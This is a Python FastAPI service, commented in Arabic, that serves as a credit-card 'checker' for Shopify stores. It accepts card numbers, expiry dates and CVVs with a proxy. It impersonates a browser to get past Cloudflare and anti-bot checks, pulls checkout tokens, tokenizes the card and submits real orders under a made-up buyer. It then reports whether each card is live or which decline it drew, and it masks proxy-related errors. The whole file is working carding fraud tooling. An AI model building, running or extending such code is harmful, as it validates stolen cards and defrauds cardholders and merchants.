from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import uuid
import random
import asyncio
from html import unescape

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def safe_response(msg, price, gate):
    """تشفير الأخطاء لحماية البروكسي من البوت"""
    clean_msg = msg.replace("Proxy", "Prx").replace("proxy", "prx").replace("Connection", "Conn").replace("connection", "conn").replace("Timeout", "T-out").replace("timeout", "t-out")
    clean_price = str(price).replace('$', '').strip() if price else "-"
    return {"Response": clean_msg, "Price": clean_price, "Gate": gate}

async def get_5way_product(session, store_url):
    """محرك الـ 5 مسارات الجبار: مستحيل أن يخرج بدون منتج"""
    def extract_price(v):
        try:
            p = float(v.get('price', 1.0))
            return "{:.2f}".format(p / 100.0 if p > 10000 else p)
        except: return "1.00"

    # مسار 1: Products API
    try:
        r = await session.get(f"{store_url}/products.json?limit=250", timeout=8)
        products = r.json().get('products', []) if isinstance(r.json(), dict) else r.json()
        for p in products:
            for v in p.get('variants', []):
                if v.get('available'): return str(v.get('id')), extract_price(v)
    except: pass

    # مسار 2: Collections API
    try:
        r = await session.get(f"{store_url}/collections/all/products.json?limit=250", timeout=8)
        products = r.json().get('products', []) if isinstance(r.json(), dict) else r.json()
        for p in products:
            for v in p.get('variants', []):
                if v.get('available'): return str(v.get('id')), extract_price(v)
    except: pass

    # مسار 3: Sitemap XML
    try:
        r = await session.get(f"{store_url}/sitemap_products_1.xml", timeout=8)
        handles = re.findall(r'<loc>[^<]+/products/([^<]+)</loc>', r.text)[:3]
        for h in handles:
            pr = await session.get(f"{store_url}/products/{h}.js", timeout=8)
            v = pr.json().get('variants', [])[0]
            if v.get('available'): return str(v.get('id')), extract_price(v)
    except: pass

    # مسار 4: Search Suggest
    try:
        r = await session.get(f"{store_url}/search/suggest.json?q=a&resources[type]=product", timeout=8)
        res = r.json().get('resources', {}).get('results', {}).get('products', [])
        for p in res:
            h = p.get('handle')
            pr = await session.get(f"{store_url}/products/{h}.js", timeout=8)
            v = pr.json().get('variants', [])[0]
            if v.get('available'): return str(v.get('id')), extract_price(v)
    except: pass

    # مسار 5: الضربة القاضية (HTML Regex) لو كل الـ API مقفول
    try:
        r = await session.get(store_url, timeout=8)
        match = re.search(r'variant_id["\']?\s*:\s*["\']?(\d+)["\']?|variants\[0\]\.id\s*=\s*(\d+)|"id":(\d{13,15})', r.text)
        if match:
            vid = match.group(1) or match.group(2) or match.group(3)
            if vid: return str(vid), "Unknown"
    except: pass

    return None, "-"

async def check_shopify_diamond(cc_info, store_url, proxy):
    try:
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return safe_response("Invalid CC Format", "-", "Shopify Diamond")
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        scope_host = store_url.replace("https://", "").replace("http://", "").split('/')[0]
        proxies = {"http": format_proxy(proxy), "https": format_proxy(proxy)} if proxy else None

        buyer = {
            "email": f"david.{random.randint(10000,99999)}@gmail.com", "first_name": "David", "last_name": "Smith",
            "address1": "4024 College Point Blvd", "city": "Flushing", "province": "NY", "zip": "11354", "country": "US", "phone": "2125551234"
        }

        # نستخدم المتصفح بصمت كامل لتخطي Cloudflare (بدون اللعب في الهيدرز)
        async with AsyncSession(impersonate="chrome120", proxies=proxies, timeout=60) as session:
            
            # 1. سحب المنتج بالـ 5 مسارات
            variant_id, price = await get_5way_product(session, store_url)
            if not variant_id: return safe_response("Store totally blocked product fetch", "-", "Shopify Diamond")

            # 2. الإضافة للسلة
            add_res = await session.post(f"{store_url}/cart/add.js", json={"id": variant_id, "quantity": 1}, headers={"X-Requested-With": "XMLHttpRequest"})
            if add_res.status_code not in [200, 201]: return safe_response("Anti-Bot Blocked Cart Add", price, "Shopify Diamond")

            await asyncio.sleep(0.5)

            # 3. الهجوم الشرعي لصفحة الدفع لتخطي الـ WAF (محاكاة ضغطة زر Checkout)
            chk_res = await session.post(f"{store_url}/cart", data={"checkout": "Checkout"}, allow_redirects=True)
            html_chk = chk_res.text
            final_url = str(chk_res.url)

            if chk_res.status_code in [403, 429] or "cloudflare" in html_chk.lower() or "just a moment" in html_chk.lower():
                return safe_response("Cloudflare WAF Blocked Request", price, "Shopify Diamond")
                
            if "/cart" in final_url and "/checkout" not in final_url:
                return safe_response("Store Removed Item (Cart Redirect)", price, "Shopify Diamond")

            # 4. الرادار العميق لاستخراج التوكن
            is_graphql = False
            session_token, classic_token, checkout_token = None, None, None

            meta_match = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html_chk)
            if meta_match and '/checkouts/' in final_url:
                is_graphql = True
                session_token = unescape(meta_match.group(1)).strip('"')
                try: checkout_token = final_url.split('/checkouts/')[1].split('/')[1]
                except:
                    ct_json = re.search(r'checkout_token["\']?\s*:\s*["\']([^"\']+)["\']', html_chk)
                    checkout_token = ct_json.group(1) if ct_json else "unknown"
            else:
                patterns = [
                    r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']',
                    r'value=["\']([^"\']+)["\'][^>]*?name=["\']authenticity_token["\']',
                    r'<meta\s+name=["\']csrf-token["\']\s+content=["\']([^"\']+)["\']'
                ]
                for p in patterns:
                    match = re.search(p, html_chk, re.IGNORECASE)
                    if match:
                        classic_token = unescape(match.group(1))
                        break

            if not is_graphql and not classic_token:
                title = re.search(r'<title>([^<]+)</title>', html_chk)
                pt = title.group(1).strip() if title else "Unknown"
                return safe_response(f"Token Hidden ({pt[:15]})", price, "Shopify Diamond")

            # 5. تشفير البطاقة
            pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json"}
            res_pci = await session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
            if res_pci.status_code != 200: return safe_response("Stripe Gate Blocked IP", price, "Shopify Diamond")
            card_session_id = res_pci.json().get("id")

            # =================================================================
            # المسار الأول: GraphQL Extensibility
            # =================================================================
            if is_graphql and session_token:
                gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
                gql_headers = {
                    'shopify-checkout-client': 'checkout-web/1.0', 'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
                    'x-checkout-web-source-id': checkout_token, 'x-checkout-one-session-token': session_token,
                    'Content-Type': 'application/json', 'Accept': 'application/json'
                }
                merch_id = str(uuid.uuid4())
                addr_data = {"address1": buyer["address1"], "city": buyer["city"], "countryCode": buyer["country"], "firstName": buyer["first_name"], "lastName": buyer["last_name"], "zoneCode": buyer["province"], "postalCode": buyer["zip"], "phone": buyer["phone"]}
                
                prop_query = """query Proposal($delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$sessionInput:SessionTokenInput!){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity}}){result{...on NegotiationResultAvailable{queueToken}}}}}"""
                prop_vars = {"delivery": {"deliveryLines": [{"destination": {"partialStreetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": True, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True}, "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": addr_data}}, "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]}, "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"]}, "sessionInput": {"sessionToken": session_token}}
                
                res_prop = await session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
                queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
                
                if not queue_token: return safe_response("GraphQL Proposal Rejected", price, "Shopify Diamond (GQL)")
                await asyncio.sleep(1)

                sub_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
                sub_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitRejected{errors{code localizedMessage}}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}}}"""
                sub_vars = {"attemptToken": f"{checkout_token}-{uuid.uuid4().hex[:10]}", "input": {"sessionInput": {"sessionToken": session_token}, "queueToken": queue_token, "delivery": {"deliveryLines": [{"destination": {"streetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": False, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {"phone": buyer["phone"]}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True}, "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]}, "payment": {"totalAmount": {"any": True}, "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319", "sessionId": card_session_id, "billingAddress": {"streetAddress": addr_data}}}, "amount": {"any": True}}], "billingAddress": {"streetAddress": addr_data}}, "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "phoneCountryCode": "US"}}}
                
                res_sub = await session.post(sub_url, json={"operationName": "SubmitForCompletion", "query": sub_query, "variables": sub_vars}, headers=gql_headers)
                sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
                if sub_data.get('__typename') == 'SubmitRejected':
                    errs = sub_data.get('errors', [])
                    return safe_response(errs[0].get('localizedMessage', 'Rejected by System') if errs else 'System Rejected', price, "Shopify Diamond (GQL)")
                
                receipt_id = sub_data.get('receipt', {}).get('id')
                if not receipt_id: return safe_response("GraphQL Submit Failed", price, "Shopify Diamond (GQL)")

                poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
                poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}}}"""
                
                for _ in range(6):
                    res_poll = await session.post(poll_url, json={"operationName": "PollForReceipt", "query": poll_query, "variables": {"receiptId": receipt_id, "sessionToken": session_token}}, headers=gql_headers)
                    if res_poll.status_code == 200:
                        p_type = res_poll.json().get('data', {}).get('receipt', {}).get('__typename')
                        if p_type == 'ProcessedReceipt': return safe_response("Order completed 💎", price, "Shopify Diamond (GQL)")
                        elif p_type == 'FailedReceipt':
                            err = res_poll.json().get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'DECLINED')
                            if "INSUFFICIENT" in err: return safe_response("Insufficient Funds", price, "Shopify Diamond (GQL)")
                            elif "CVC" in err: return safe_response("Incorrect CVC", price, "Shopify Diamond (GQL)")
                            elif "ZIP" in err or "ADDRESS" in err: return safe_response("ZIP Code Mismatch", price, "Shopify Diamond (GQL)")
                            elif "DO_NOT_HONOR" in err: return safe_response("Do Not Honor", price, "Shopify Diamond (GQL)")
                            return safe_response(f"Declined: {err}", price, "Shopify Diamond (GQL)")
                    await asyncio.sleep(1.5)
                return safe_response("Timeout waiting for Bank", price, "Shopify Diamond (GQL)")

            # =================================================================
            # المسار الثاني: الكلاسيكي
            # =================================================================
            elif classic_token:
                addr_payload = {"_method": "patch", "authenticity_token": classic_token, "previous_step": "contact_information", "step": "shipping_method", "checkout[email]": buyer["email"], "checkout[shipping_address][first_name]": buyer["first_name"], "checkout[shipping_address][last_name]": buyer["last_name"], "checkout[shipping_address][address1]": buyer["address1"], "checkout[shipping_address][city]": buyer["city"], "checkout[shipping_address][country]": buyer["country"], "checkout[shipping_address][province]": buyer["province"], "checkout[shipping_address][zip]": buyer["zip"], "checkout[shipping_address][phone]": buyer["phone"]}
                res_addr = await session.post(final_url, data=addr_payload, allow_redirects=True)
                
                classic_token2 = classic_token
                match2 = re.search(r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']', res_addr.text)
                if match2: classic_token2 = unescape(match2.group(1))
                
                res_ship = await session.post(str(res_addr.url), data={"_method": "patch", "authenticity_token": classic_token2, "previous_step": "shipping_method", "step": "payment_method"}, allow_redirects=True)
                
                gate_match = re.search(r'value=["\'](\d+)["\'][^>]*?name=["\']checkout\[payment_gateway\]["\']', res_ship.text)
                gateway_id = gate_match.group(1) if gate_match else "1"
                
                classic_token3 = classic_token2
                match3 = re.search(r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']', res_ship.text)
                if match3: classic_token3 = unescape(match3.group(1))

                pay_payload = {"_method": "patch", "authenticity_token": classic_token3, "previous_step": "payment_method", "step": "", "s": card_session_id, "checkout[payment_gateway]": gateway_id, "checkout[credit_card][vault]": "false", "complete": "1"}
                res_pay = await session.post(str(res_ship.url), data=pay_payload, allow_redirects=True)
                res_text = res_pay.text.lower()
                
                if "thank you" in res_text or "order completed" in res_text: return safe_response("Order completed 💎", price, "Shopify Diamond (Classic)")
                elif "insufficient" in res_text: return safe_response("Insufficient Funds", price, "Shopify Diamond (Classic)")
                elif "incorrect_cvc" in res_text or "security code" in res_text: return safe_response("Incorrect CVC", price, "Shopify Diamond (Classic)")
                elif "zip code" in res_text or "avs" in res_text: return safe_response("ZIP Code Mismatch", price, "Shopify Diamond (Classic)")
                else:
                    err = re.search(r'class="field__message field__message--error">([^<]+)<', res_pay.text)
                    return safe_response(err.group(1).strip() if err else "Declined / Bank Block", price, "Shopify Diamond (Classic)")

            return safe_response("Unknown Store Architecture", price, "Shopify Diamond")

    except Exception as e:
        return safe_response(f"Sys_Err: {str(e)[:40]}", "-", "Shopify Diamond")

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    return JSONResponse(content=await check_shopify_diamond(cc, url, proxy))
